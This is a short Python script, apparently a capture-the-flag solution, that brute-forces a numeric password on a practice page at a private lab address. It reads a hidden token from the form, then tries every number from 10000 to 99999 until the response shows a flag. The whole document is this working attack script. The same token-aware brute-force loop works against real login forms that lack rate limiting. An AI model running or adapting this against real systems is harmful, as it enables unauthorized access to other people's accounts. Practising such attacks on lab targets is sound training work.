#coding=utf-8
import requests
import re
from bs4 import BeautifulSoup
pattern = 'flag:.*'
s = requests.session()
html = s.get('http://192.168.199.199/practisepages/ctf/brute_force/brute.php')
soup = BeautifulSoup(html.text,'html.parser')
inputform = soup.find_all('input',type = 'hidden')
value = str(inputform[0].get('value'))
#print session
for i in range(10000,99999):
	payload = {'password':i, 'check':value}
	html = s.get(url='http://192.168.199.199/practisepages/ctf/brute_force/brute.php', params=payload)
	ss = re.search(pattern,html.text)
	if ss:
		print(ss.group())
		exit('Get it!')
	else:
		print('error password: ',i)